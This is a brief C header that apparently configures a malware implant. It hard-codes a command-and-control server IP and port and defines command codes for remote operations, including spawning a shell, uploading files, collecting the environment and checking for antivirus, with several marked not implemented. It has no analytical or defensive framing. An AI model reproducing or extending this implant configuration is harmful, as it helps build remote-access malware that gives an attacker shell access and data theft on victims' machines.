/* --- C2 connection properties --- */
#define C2PORT 8080
#define C2SERVER "3.15.16.149"

/* error codes for executing modules */
#define MODULE_NOTFOUND "2"
#define MODULE_ERROR "1"

/* module codes for referencing when receiving a command */
#define DISCONNECT 0
#define CLEANUP 1         /* not implemented */
#define SPAWN_SHELL 2
#define FILE_UPLOAD 3     /* not implemented */
#define GET_ENVIRONMENT 4 /* not implemented */
#define GET_ANTIVIRUS 5   /* not implemented */




